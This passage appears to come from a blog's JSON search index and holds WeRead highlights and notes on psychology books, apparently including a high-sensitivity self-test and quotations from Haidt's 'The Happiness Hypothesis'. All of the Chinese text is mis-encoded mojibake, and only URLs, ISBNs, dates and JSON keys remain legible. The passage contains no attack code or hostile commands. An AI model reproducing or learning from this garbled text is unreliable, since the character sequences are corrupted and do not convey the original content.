‡å‡†ï¼Œå¤§èƒ†åšè‡ªå·±ï¼Œæ›´å¥½åœ°åˆ©ç”¨è‡ªå·±çš„ç‰¹æ®Šç¦€èµ‹ï¼Œé€ ç¦è‡ªå·±å’Œä»–äººã€‚ é«˜åº¦æ•æ„Ÿçš„åŠ›é‡ + ã€Šé«˜åº¦æ•æ„Ÿçš„åŠ›é‡ã€‹ å±æ€§ å†…å®¹ ISBN 9787220110955 ä½œè€… å¡ç‰¹ç³Â·ä½æ–¯ç‰¹ å‡ºç‰ˆå¹´ 2019-02-01 å‡ºç‰ˆç¤¾ å››å·äººæ°‘å‡ºç‰ˆç¤¾ æ¥æº é«˜åº¦æ•æ„Ÿçš„åŠ›é‡ åˆ†ç±» å¿ƒç†-å¿ƒç†å­¦åº”ç”¨ é«˜äº®åˆ’çº¿ è‡ªæˆ‘æµ‹è¯• è‡ªæˆ‘æµ‹è¯• 1ï¼æˆ‘çš„å¬è§‰ã€è§†è§‰ã€å—…è§‰ã€å‘³è§‰ã€è§¦è§‰éå¸¸æ•æ„Ÿï¼Œæˆ‘çš„æ„Ÿå®˜å°è±¡ç»å¸¸ä½¿æˆ‘æ„Ÿåˆ°ä¸é€‚ã€‚2ï¼æˆ‘æœ€å–œæ¬¢å®‰é™è‡ªä¸»åœ°å·¥ä½œã€‚3ï¼å¯¹æˆ‘æ¥è¯´ï¼Œæ‰¾åˆ°è‡ªå·±çš„ä½¿å‘½å¾ˆé‡è¦ã€‚4ï¼æˆ‘æ€è€ƒé—®é¢˜çš„æ—¶å€™ä¼šè€ƒè™‘å„æ–¹é¢çš„è”ç³»ï¼Œä»¥è§£å†³é—®é¢˜ä¸ºå¯¼å‘ï¼Œå…¨é¢åœ°æ€è€ƒé—®é¢˜ã€‚5ï¼å³ä½¿æˆ‘æœ‰å…´è¶£å»å‚åŠ ä¸€ä¸ªèšä¼šæˆ–ä¸€ä¸ªå¤§å‹æ´»åŠ¨ï¼Œæ´»åŠ¨ä¸­çš„äººå’Œäº‹ä¹Ÿä¼šå¾ˆå¿«è®©æˆ‘æ„Ÿåˆ°ç–²æƒ«ã€‚6ï¼å½“æˆ‘è¿˜æ˜¯å­©å­çš„æ—¶å€™ï¼Œæˆ‘çš„æ€ç»ªç»å¸¸å¤©é©¬è¡Œç©ºã€‚æ—¶è‡³ä»Šæ—¥ï¼Œæˆ‘ä»ç„¶æ‹¥æœ‰åˆ«äººæ— æ³•ç†è§£çš„æƒ³è±¡åŠ›ã€‚7ï¼ä¸€æ–¹é¢æˆ‘å¯ä»¥äº«å—ç”Ÿæ´»ä¸­ç¾å¥½ã€ç²¾è‡´ã€æ¸©æŸ”çš„äº‹ç‰©ï¼Œå¯å¦ä¸€æ–¹é¢å™ªéŸ³ã€æ˜äº®çš„ç¯å…‰ã€å¼ºçƒˆçš„æ°”å‘³ã€ç˜¦å°çš„è¡£æœä»¥åŠäººç¾¤åˆ™è®©æˆ‘æ„Ÿåˆ°æ— æ³•å¿å—ã€‚8ï¼å½“æˆ‘æ„Ÿå—åˆ°è¿‡åº¦çš„åˆºæ¿€æ—¶ï¼Œæˆ‘ä¼šèº²åˆ°ä¸€ä¸ªå®‰é™çš„åœ°æ–¹ç‹¬å¤„ã€‚9ï¼èƒ½å¾—åˆ°èµè¯†ä»¥åŠåœ¨ä¸æˆ‘ä»·å€¼è§‚ç›¸ç¬¦çš„åœ°æ–¹å·¥ä½œå¯¹äºæˆ‘æ¥è¯´éå¸¸é‡è¦ã€‚10ï¼æˆ‘çš„æœ‹å‹ä¸å¤šï¼Œä½†æ˜¯å…³ç³»ç›¸å½“äº²å¯†ï¼Œæˆ‘ä»¬ä¼šè¿›è¡Œæ·±å…¥çš„å¯¹è¯ã€‚11ï¼å½“å…¶ä»–äººåˆšåˆšè¾¾åˆ°æœ€ä½³ç«æŠ€çŠ¶æ€æ—¶ï¼Œæˆ‘é€šå¸¸å·²ç»ç²¾ç–²åŠ›ç«­äº†ã€‚12ï¼æˆ‘å¯¹è¯ç‰©ã€å’–å•¡ã€èŒ¶ã€å°¼å¤ä¸ã€é…’ç²¾éå¸¸æ•æ„Ÿã€‚13ï¼æˆ‘æ¯”è¾ƒå®¹æ˜“å‡ºç°è¿‡æ•ååº”ã€‚14ï¼æˆ‘å¯ä»¥æ„Ÿå—åˆ°åˆ«äººçš„çŠ¶æ€ã€‚è€Œä¸”æˆ‘è‡ªå·±çš„æ„Ÿè§‰å’Œåˆ«äººçš„æ„Ÿè§‰ä¹‹é—´çš„ç•Œé™ç»å¸¸ä¼šå˜å¾—æ¨¡ç³Šã€‚15ï¼æˆ‘éœ€è¦å¾ˆé•¿æ—¶é—´æ¥å¤„ç†è‡ªå·±ç»å†è¿‡çš„äº‹ä»¶ã€‚æœ‰æ—¶å€™æˆ‘ä¼šçªç„¶æƒ³èµ·ä»¥å‰çš„ä¸€ä»¶äº‹ï¼Œç„¶ååœ¨è„‘æµ·ä¸­â€œå›é¡¾â€ä¸€éã€‚16ï¼æˆ‘è®¨åŒåœ¨ä¸€é—´å¾ˆå¤§çš„åŠå…¬å®¤é‡Œå·¥ä½œã€‚17ï¼æˆ‘ä¼šé¿å…æ¥è§¦é‚£äº›åŒ…å«æš´åŠ›ã€æ­»äº¡å’Œæ”»å‡»æ€§å› ç´ çš„æ¶ˆæ¯å’Œç”µå½±ã€‚18ï¼åªæœ‰å½“æˆ‘æ„Ÿåˆ°æˆ‘çš„å·¥ä½œæœ‰æ„ä¹‰ï¼Œå¹¶ä¸”å¯ä»¥å‘æŒ¥æˆ‘çš„é•¿å¤„æ—¶ï¼Œæˆ‘æ‰ä¼šåœ¨å·¥ä½œä¸­æ„Ÿåˆ°èˆ’å¿ƒã€‚19ï¼åœ¨æˆ‘çš„ç”Ÿæ´»ä¸­ï¼Œå…¬æ­£ã€ä¿¡ä»°ã€æ„ä¹‰ã€ä»·å€¼ã€ä¼¦ç†ä»¥åŠçµæ€§å¾ˆé‡è¦ã€‚20ï¼æ®æˆ‘è§‚å¯Ÿï¼Œæˆ‘çš„å¿ƒçµå’Œèº«ä½“å¯¹å‹åŠ›ã€ä¸è‰¯é¥®é£Ÿã€ç¼ºä¹è¿åŠ¨å’Œé«˜å‹ç¯å¢ƒçš„ååº”æ¯”å…¶ä»–äººè¦å¿«ã€‚21ï¼æ¥è‡ªåª’ä½“ã€çŸ­ä¿¡ã€é‚®ä»¶æ´ªæµä¸­çš„åˆºæ¿€è®©æˆ‘å¾ˆä¸èˆ’æœã€‚22ï¼å…¶ä»–äººè§‰å¾—æˆ‘çš„è§‚å¯Ÿç»†è‡´å…¥å¾®ï¼Œæ„Ÿè§‰çµæ•ã€‚23ï¼å¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼Œäº²å¯†æ„Ÿå’Œè·ç¦»æ„Ÿä¹‹é—´çš„å¹³è¡¡åœ¨äº²å¯†çš„å…³ç³»ä¸­éå¸¸é‡è¦ã€‚24ï¼æˆ‘çš„é•¿å¤„åŒ…æ‹¬æœ‰ç§»æƒ…èƒ½åŠ›ã€ç›´è§‰å’Œåˆ›é€ æ€§ã€‚25ï¼æˆ‘ç»å¸¸å¯ä»¥æ„Ÿå—åˆ°æŸä¸ªäººå¿ƒå£ä¸ä¸€ï¼Œå¹¶ä¸”å¤§å¤šæ•°æ—¶å€™å®ƒä»¬å¯ä»¥åœ¨æ¥ä¸‹æ¥çš„æ¥è§¦ä¸­å¾—åˆ°è¯å®ã€‚26ï¼æˆ‘å¯ä»¥å¾ˆå¿«åœ°æ‰¿æ‹…è´£ä»»ï¼Œä½†æˆ‘åªæœ‰åœ¨è‡ªèº«èƒ½åŠ›å…è®¸çš„æƒ…å†µä¸‹æ‰ä¼šæ¥å—æŸä¸€é¡¹ä»»åŠ¡æˆ–è¯¢é—®ã€‚27ï¼å½“äººä»¬å’Œæˆ‘çš„ä»·å€¼è§‚ã€æœŸå¾…ä¸åˆæ—¶ï¼Œæˆ‘å¿…é¡»æ³¨æ„ï¼Œä¸å¯¹ä»–ä»¬è¿›è¡Œè¯„ä»·ã€‚28ï¼ä»å°æˆ‘å°±è§‰å¾—å¾ˆå¤šäººä¸æ•æ„Ÿæˆ–è€…ä¸é¡¾åŠåˆ«äººçš„æ„Ÿå—ã€‚29ï¼åœ¨çªå‘äº‹ä»¶ä¸­ï¼Œæˆ‘å¯ä»¥ä¿æŒè¡ŒåŠ¨èƒ½åŠ›ï¼Œå¹¶ä¸”èƒ½å¤Ÿå¿«é€ŸæŒæ§å…¨å±€ã€‚30ï¼æœ‰æ—¶å€™æˆ‘å¯ä»¥äº‹å…ˆå°±çŸ¥é“å°†è¦å‘ç”Ÿä»€ä¹ˆï¼Œæˆ–è€…å¯ä»¥ä¸å—è·ç¦»çš„é™åˆ¶æ„Ÿå—åˆ°æˆ‘èº«è¾¹çš„äººé‡åˆ°äº†è®©ä»–ä¸æ„‰å¿«çš„äº‹ã€‚ â€” åˆ›å»ºäº [[2021-12-16]] 00:41 ^9-634-2625 ç¤¾äº¤å’Œæƒ…æ„Ÿ ç¤¾äº¤å’Œæƒ…æ„Ÿ å› ä¸ºé«˜åº¦æ•æ„Ÿçš„äººå–œæ¬¢æ·±åˆ»é€å½»çš„äº‹ç‰©ï¼Œè¡¨é¢ä¸Šè‚¤æµ…çš„è°ˆè¯å’Œé—²èŠæ— æ³•å¼•èµ·æˆ‘ä»¬çš„å…´è¶£ï¼Œå“ªæ€•æˆ‘ä»¬å¯ä»¥åœ¨é—²èŠä¸­æ”¶æ”¾è‡ªå¦‚ï¼Œä¸å—åˆ°ä»€ä¹ˆæ‹˜æŸï¼Œç”šè‡³ä»ä¸­è·ç›Šã€‚è¿™å¯èƒ½ä¹Ÿæ˜¯æˆ‘ä»¬è°¨æ…æ‹©å‹ï¼Œå®æ„¿åªæ‹¥æœ‰å°‘é‡äº²å¯†çš„æœ‹å‹ï¼Œè€Œä¸æ˜¯å¾ˆå¤šæ³›æ³›ä¹‹äº¤çš„åŸå› ä¹‹ä¸€ã€‚é«˜è´¨é‡çš„å‹è°Šæ„å‘³ç€äººä¸äººä¹‹é—´å½¢æˆäº†ä¸€ç§ç´§å¯†çš„è”ç»“ï¼ŒåŒæ–¹éƒ½å°†è¿™ç§å…³ç³»è§†ä¸ºä¸€ç§åŠ›é‡å’Œèƒ½é‡çš„æºæ³‰ã€‚ â€” åˆ›å»ºäº [[2021-12-17]] 00:27 ^16-781-936 èŒåœº èŒåœº å¼€æ”¾å¼åŠå…¬å®¤é‡Œæ°¸ä¸ç¼ºå¸­çš„å™ªéŸ³ä»¥åŠæ°›å›´ï¼Œå¯¹å†…å‘çš„äººæ¥è¯´å°¤å…¶æ˜¯ä¸€ç§å·¨å¤§çš„æŒ‘æˆ˜ï¼Œå³ä¾¿å¯¹å¤–å‘çš„äººæ¥è¯´ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å†è€ƒè™‘åˆ°ï¼ˆé«˜åº¦ï¼‰æ•æ„Ÿçš„äººï¼Œå¼€æ”¾å¼åŠå…¬å®¤è™½ç„¶èƒ½ç»™äººåŠªåŠ›çš„æ„æ„¿å’Œç§¯ææ€§ï¼Œä½†æ˜¯å®åœ¨è®©äººæ— æ³•å¿å—ã€‚ â€” åˆ›å»ºäº [[2022-01-08]] 15:04 ^62-795-891","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"}]},{"title":"è¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç ","date":"2024-08-31T01:35:29.262Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†/è¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç -ç´«åˆ/","text":"ä½œè€…ï¼šç´«åˆ - å†…å®¹ç®€ä»‹ ã€Šè¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç ã€‹ ç”Ÿå‘½ä¹‹ä¸­æˆ–è®¸æœ‰è®¸å¤šæŒ¥ä¹‹ä¸å»çš„æƒ…æ„Ÿå’Œä½“éªŒï¼Œåªæ˜¯æˆ‘ä»¬åº”å½“åšä¿¡ï¼šä¸è¯¥ç•™çš„å°†éšé£è€Œå»ï¼Œè¯¥ç•™ä¸‹çš„ä¸€å®šä¼šä¼´éšæˆ‘ä»¬ä¸€ç”Ÿã€‚å½“ä½ ç”¨å¿ƒæ„Ÿå—ã€Šè¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç ã€‹æ‰€å¸¦ç»™ä½ çš„ç¥å¥‡åŠ›é‡ä¹‹æ—¶ï¼Œä½ å°±ä¸€å®šèƒ½å¤Ÿè½»æ¾åº”å¯¹ç”Ÿæ´»ä¸­çš„ç§ç§å˜åŒ–ï¼Œä½ ä¹Ÿå°†å¾ˆå¿«åˆ›é€ å‡ºå®Œå…¨é€‚åˆè‡ªå·±çš„è§£å‹æ–¹æ³•ã€‚è¿™ä¹Ÿæ¸æ¸åœ°æˆå°±äº†ä½ äººç”Ÿçš„ç»éªŒï¼Œå­¦ä¼šé€‚å½“æŠ›å¼ƒä¸€äº›å‹åœ¨èƒŒä¸Šçš„åŒ…è¢±ï¼Œä½ å°†ä¸ä¼šå› ç”Ÿæ´»çš„é‡å‹è€Œè¢«å‹å€’ã€‚ è¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç  + ã€Šè¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç ã€‹ å±æ€§ å†…å®¹ ISBN 9787800848032 ä½œè€… ç´«åˆ å‡ºç‰ˆå¹´ 2006-01-01 å‡ºç‰ˆç¤¾ é‡‘åŸå‡ºç‰ˆç¤¾ æ¥æº è¶…çº§è§£å‹ï¼šå¿«ä¹ä¸€ç”Ÿçš„31æ¡å‹åŠ›è§£ç  åˆ†ç±» å¿ƒç†-å¿ƒç†å­¦åº”ç”¨ é«˜äº®åˆ’çº¿ ç¬¬å››ç«  æ‚²è§‚è§£ç  ç¬¬å››ç«  æ‚²è§‚è§£ç  äººç”Ÿçš„å¹¸ç¦ã€å¿«ä¹ä¸å¦ï¼Œå¾€å¾€å¹¶ä¸å®Œå…¨å–å†³äºç°å®çš„ä¸–ç•Œï¼Œä¸€å®šç¨‹åº¦ä¸Šå–å†³äºæˆ‘ä»¬å¯¹ä¸–ç•Œçš„çœ‹æ³•ï¼Œäº¦å³å¯¹é—®é¢˜çš„çœ‹æ³•ï¼Œç§ç§çƒ¦æ¼çš„åŸå› ä¹Ÿå¾€å¾€ä¸åœ¨äºå¤–ç•Œäº‹æ€ï¼Œè€Œæ˜¯ä¸»è¦å–å†³äºæˆ‘ä»¬å¯¹è¯¥äº‹æ€çš„çœ‹æ³•ã€‚ â€” åˆ›å»ºäº [[2023-05-29]] 09:08 ^6-4751-4838","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"}]},{"title":"è±¡ä¸éª‘è±¡äºº","date":"2024-08-31T01:35:29.258Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†/è±¡ä¸éª‘è±¡äºº-ä¹”çº³æ£®Â·æµ·ç‰¹ /","text":"ä½œè€…ï¼šä¹”çº³æ£®Â·æµ·ç‰¹ - å†…å®¹ç®€ä»‹ ã€Šè±¡ä¸éª‘è±¡äººã€‹ ã€Šè±¡ä¸éª‘è±¡äººã€‹ä½œè€…ä¹”çº³æ£®Â·æµ·ç‰¹æ˜¯è‘—åå¿ƒç†å­¦å®¶ï¼Œå¦æ™®å°”é¡¿ç§¯æå¿ƒç†å­¦å¥–è·å¾—è€…,ä¼Ÿå¤§çš„æ€æƒ³å®¶ã€ç§¯æå¿ƒç†å­¦å…ˆé”‹æ´¾é¢†è¢–ã€‚ä¹”çº³æ£®Â·æµ·ç‰¹åœ¨ã€Šè±¡ä¸éª‘è±¡äººã€‹ä¸­æŠŠäººç±»æ€è€ƒäº†ä¸¤åƒå¤šå¹´çš„é—®é¢˜ï¼Œå½’ç»“ä¸º10ä¸ªå‡è®¾ï¼Œæ”¾åœ¨ç§‘å­¦çš„å¤©å¹³ä¸Šï¼Œåˆ°åº•å“ªäº›æ˜¯çœŸç†ï¼Œå“ªäº›æ˜¯è°¬è¯¯ï¼Ÿæµ·ç‰¹æå‡ºï¼Œäººçš„å¿ƒç†å¯åˆ†ä¸ºä¸¤åŠï¼Œä¸€åŠåƒä¸€å¤´æ¡€éªœä¸é©¯çš„å¤§è±¡ï¼Œå¦ä¸€åŠåˆ™æ˜¯ç†æ€§çš„éª‘è±¡äººã€‚è¿™ä¸¤ä¸ªåˆ†è£‚çš„éƒ¨åˆ†ï¼Œä½¿å¾—äººä»¬å¸¸å¸¸é™·äºç†æ€§ä¸éç†æ€§çš„æ€æƒ³äº‰æˆ˜ä¹‹ä¸­ï¼Œè€Œè¿™ç§äº‰æˆ˜ä¸ä»…ä¼šå½±å“æˆ‘ä»¬çš„å†³ç­–ï¼Œä¹Ÿä¼šå‰Šå¼±æˆ‘ä»¬çš„å¹¸ç¦æ„Ÿã€‚ä¹”çº³æ£®Â·æµ·ç‰¹èåˆäº†å¿ƒç†å­¦ã€å“²å­¦ã€ä¼¦ç†å­¦ã€å®—æ•™ä»¥åŠäººç±»å­¦ç­‰å­¦ç§‘çŸ¥è¯†ï¼Œå¤§é‡å¼•ç”¨äº†å¤ä»Šä¸œè¥¿æ–¹å“²å­¦ã€æ–‡å­¦ä¸å®—æ•™ä¸­æœ‰å…³äººçš„å¿ƒç†çš„çœ‹æ³•ï¼Œç»§è€Œä»¥ç°ä»Šç¥ç»ç§‘å­¦ä¸ç¤¾ä¼šå¿ƒç†å­¦çš„ç ”ç©¶æˆæœï¼Œæ¥éªŒè¯å…³äºå¤è€çš„å…³äºå¹¸ç¦çš„å‡è®¾ã€‚ä¹”çº³æ£®Â·æµ·ç‰¹ä¸ä»…è®©æˆ‘ä»¬äº†è§£åˆ°ï¼Œä¹‹å‰å¾ˆå¤šçš„æ‰€è°“çš„â€œå¤è€æ™ºæ…§â€å¹¶ä¸æ˜¯çœŸè°›ï¼Œè€Œä¸”è¿˜è®©æˆ‘ä»¬æ‡‚å¾—ï¼Œå¦‚ä½•ç§¯æåœ°ã€ç†æ€§åœ°å»å¯»æ‰¾å¹¸ç¦å’Œç”Ÿå‘½çš„æ„ä¹‰ã€‚ è±¡ä¸éª‘è±¡äºº + ã€Šè±¡ä¸éª‘è±¡äººã€‹ å±æ€§ å†…å®¹ ISBN 9787213050145 ä½œè€… ä¹”çº³æ£®Â·æµ·ç‰¹ å‡ºç‰ˆå¹´ 2012-11-25 å‡ºç‰ˆç¤¾ æµ™æ±Ÿäººæ°‘å‡ºç‰ˆç¤¾ æ¥æº è±¡ä¸éª‘è±¡äºº åˆ†ç±» å¿ƒç†-å¿ƒç†å­¦ç ”ç©¶ é«˜äº®åˆ’çº¿ å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ å› ä¸ºäººæ˜¯é€šè¿‡å¿ƒç†æ»¤é™¤ï¼ˆmental filterï¼‰æ¥çœ‹è¿™ä¸ªä¸–ç•Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå‡ºç°æŸäº›æƒ…ç»ªï¼Œä¼šå¯¹äº‹ä»¶æœ‰ååº”ï¼Œä¸”å‡ºç°æŸäº›å¿ƒç†ç–¾ç—…ã€‚èå£«æ¯”äºšä»¥ä¸‹è¿™å¥è¯åˆšå¥½ç®€è¦åœ°è¯´æ˜äº†è¿™ç§ç°è±¡ï¼šâ€œäº‹æƒ…æ²¡æœ‰å¥½åï¼Œæ˜¯äººçš„æ€æƒ³åœ¨ä½œç¥Ÿã€‚â€æˆ‘å¼€å§‹ç”¨è¿™äº›å¼•è¨€æ¥å¸®åŠ©æˆ‘çš„å­¦ç”Ÿè®°ä½å¿ƒç†å­¦çš„é‡è¦è§‚å¿µï¼ŒåŒæ—¶ï¼Œæˆ‘ä¹Ÿå¼€å§‹æ€è€ƒç±»ä¼¼çš„è§‚å¿µè¿˜æœ‰å“ªäº›ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:13 ^87-1328-1476 äº‹æƒ…å½“ç„¶ä¼šæœ‰å¥½åï¼Œæ€æƒ³ä½œç¥Ÿæ˜¯å¯¹ä¸–ç•Œçš„è®¤çŸ¥ä¸å¤Ÿï¼å¥½çš„äº‹ä¸€å®šæ˜¯èƒ½ä»äººè‡ªç„¶çš„ååº”ä¸­çœ‹å‡ºæ¥çš„ï¼ä½†ä¹Ÿå¯èƒ½å­˜åœ¨çˆ±ä½ çœ¼é‡Œå¥½çš„äº‹åœ¨åˆ«äººçœ¼é‡Œæ˜¯åçš„ï¼ å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ å¹¸ç¦ä¸åªæ¥è‡ªæˆ‘ä»¬çš„å†…å¿ƒï¼Œä¹Ÿæ¥è‡ªå¤–åœ¨ã€‚æˆ‘ä»¬éœ€è¦å¤è€çš„æ™ºæ…§åŠç°ä»£ç§‘å­¦çš„å¼•å¯¼ï¼Œä»¥è·å¾—ä¸¤è€…é—´çš„å¹³è¡¡ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:20 ^87-3425-3471 å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ é‚£äº›æ€ä¸æ­»æˆ‘çš„ï¼Œå¿…ä½¿æˆ‘æ›´å¼ºå¤§ã€‚â€ â€” åˆ›å»ºäº [[2021-05-19]] 00:21 ^87-3529-3545 å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ äººçš„å­˜åœ¨æœ‰ä¸€ç§ç²¾ç¥å±‚é¢çš„å‚ç›´ç»´åº¦ã€‚ä½ ç§°ä¹‹ä¸ºâ€œé«˜è´µã€ç¾å¾·æˆ–ç¥æ€§â€ä¹Ÿå¥½ï¼Œä½ ä¿¡ä¸ä¿¡ä¸Šå¸ä¹Ÿæ— å¦¨ï¼Œä½†æ˜¯äººçœŸçš„ä¼šåœ¨åˆ«äººèº«ä¸Šæˆ–åœ¨å¤§è‡ªç„¶ä¸­æ„Ÿå—åˆ°ç¥åœ£ã€åº„ä¸¥æˆ–é‚£ç§éš¾ä»¥å½¢å®¹çš„å–„ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:23 ^87-3894-3973 å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ ç®€çŸ­çš„å‰è¨€å®åœ¨æ— æ³•è§£é‡Šå¾—æ¸…æ¥šï¼Œè€Œä¸”ä¹Ÿä¼šè´¬ä½å…¶ä»·å€¼ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:24 ^87-4215-4240 æœ‰å…³å¿ƒç†çš„å¤è€æ¯”å–» æœ‰å…³å¿ƒç†çš„å¤è€æ¯”å–» å¼—æ´›ä¼Šå¾·æå‡ºç›¸å…³çš„æ¨¡å‹ã€‚ä»–æŒ‡å‡ºï¼Œäººæ ¼åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼šè‡ªæˆ‘ï¼ˆegoï¼Œå³æœ‰æ„è¯†ã€ç†æ€§çš„è‡ªæˆ‘ï¼‰ã€è¶…æˆ‘ï¼ˆsuperegoï¼Œå³é“å¾·è‰¯å¿ƒï¼Œæœ‰æ—¶ä¼šè¿‡äºæ‹˜æ³¥äºç¤¾ä¼šè§„èŒƒï¼‰ä»¥åŠæœ¬æˆ‘ï¼ˆidï¼Œå³äº«ä¹çš„æ¬²æœ›ï¼Œå„ç§æ¬²æœ›ï¼Œæ€»æƒ³åŠæ—¶è¡Œä¹ï¼‰ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:31 ^90-1193-1296 ä½œè€…çš„æ¯”å–»ä¹Ÿå¾ˆé€šä¿— é˜»ç¢å¹¸ç¦çš„3ä¸ªéšœç¢ é˜»ç¢å¹¸ç¦çš„3ä¸ªéšœç¢ å¹¸ç¦éšœç¢1ï¼šæ— èƒ½çš„æ„å¿—åŠ›â˜… â€” åˆ›å»ºäº [[2021-05-21]] 23:43 ^92-415-460 é˜»ç¢å¹¸ç¦çš„3ä¸ªéšœç¢ å¹¸ç¦éšœç¢2ï¼šå¿ƒç†å¹²æ‰° â€” åˆ›å»ºäº [[2021-05-21]] 23:43 ^92-1600-1610 é˜»ç¢å¹¸ç¦çš„3ä¸ªéšœç¢ å¹¸ç¦éšœç¢3ï¼šå† å†•å ‚çš‡çš„ç†ç”± â€” åˆ›å»ºäº [[2021-05-21]] 23:44 ^92-3447-3460 ç¬¬2ç«  æ˜¯ä»€ä¹ˆä»¤ä½ å¹¸ç¦ ç¬¬2ç«  æ˜¯ä»€ä¹ˆä»¤ä½ å¹¸ç¦ é™¤éä½ è§‰å¾—æ‚²æƒ¨ï¼Œå¦åˆ™æ²¡æœ‰ä»€ä¹ˆæ˜¯æ‚²æƒ¨çš„ï¼›åŒç†ï¼Œé™¤éä½ çŸ¥è¶³å¸¸ä¹ï¼Œå¦åˆ™æ²¡æœ‰ä»€ä¹ˆäº‹èƒ½è®©ä½ å¿«ä¹ã€‚ â€” åˆ›å»ºäº [[2021-05-23]] 01:29 ^93-2870-2913 ä»¤ä½ æ„Ÿåˆ°ä¸å¹¸ç¦çš„3ä¸ªåŸå›  ä»¤ä½ æ„Ÿåˆ°ä¸å¹¸ç¦çš„3ä¸ªåŸå›  â€œå¿«ä¹â€å…¶å®æ˜¯äººçš„ä¸ªæ€§ä¸­æœ€å—é—ä¼ å½±å“çš„ç‰¹è´¨ã€‚åŒèƒèƒçš„ç ”ç©¶æ˜¾ç¤ºï¼Œä¸ªäººå¹³æ—¶çš„å¿ƒæƒ…æ„‰æ‚¦çš„ç¨‹åº¦æœ‰50%~80%å¯å½’å’äºåŸºå› ï¼Œè€Œéç”Ÿæ´»ç»éªŒã€‚ â€” åˆ›å»ºäº [[2021-05-25]] 00:01 ^94-6977-7042 ç¬¬3ç«  äº’æƒ  ç¬¬3ç«  äº’æƒ  å­è´¡é—®æ›°ï¼šâ€œæœ‰ä¸€è¨€è€Œå¯ä»¥ç»ˆèº«è¡Œä¹‹è€…ä¹ï¼Ÿâ€å­æ›°ï¼šâ€œå…¶æ•ä¹ï¼å·±æ‰€ä¸æ¬²ï¼Œå‹¿æ–½äºäººä¹Ÿã€‚â€â€”â€”ã€Šè®ºè¯­ã€‹ â€” åˆ›å»ºäº [[2021-05-25]] 00:33 ^97-464-547 å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ å› ä¸ºäººæ˜¯é€šè¿‡å¿ƒç†æ»¤é™¤ï¼ˆmental 